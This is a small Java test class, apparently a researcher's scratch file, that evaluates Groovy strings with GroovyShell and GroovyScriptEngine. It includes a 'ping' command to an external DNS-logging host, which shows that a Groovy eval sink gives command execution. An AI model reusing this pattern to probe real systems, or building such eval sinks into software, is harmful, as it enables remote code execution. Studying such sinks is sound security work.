import groovy.lang.GroovyObjectSupport;
import groovy.lang.Binding;
import groovy.lang.GroovyShell;

import groovy.util.GroovyScriptEngine;

import javax.script.ScriptEngineManager;
import javax.script.ScriptEngine;
import javax.script.ScriptException;

public class TestGroovy{
        public static void main(String[] args) throws Exception{
                //ScriptEngineManager factory = new ScriptEngineManager();
                //ScriptEngine engine = factory.getEngineByName("groovy");
                //engine.put("first", "HELLO");
                //engine.put("second", "world");
                //String result = (String) engine.eval("first.toLowerCase() + ' ' + second.toUpperCase()");
                //testGroovyScriptEngine();
                //testGroovyShell();
                //

        }

        public static void testGroovyScriptEngine() throws Exception{
                GroovyScriptEngine engine = new GroovyScriptEngine("");
                Object obj = engine.run("script_test.groovy", "cqq");
                /**
                 * "script_test.groovy"
                 * 'ping groovy2.a69a8d07833b17bfc67a.d.zhack.ca'.execute();
                 */
                System.out.println(obj);
        }


        public static void testGroovyShell() throws Exception{
                Binding binding = new Binding();
                binding.setVariable("name", "cqq");    //这一行没必要

                GroovyShell groovyShell = new GroovyShell(binding);
                Object obj = groovyShell.evaluate("'ping groovy.a69a8d07833b17bfc67a.d.zhack.ca'.execute();");
                System.out.println(obj);
        }
}
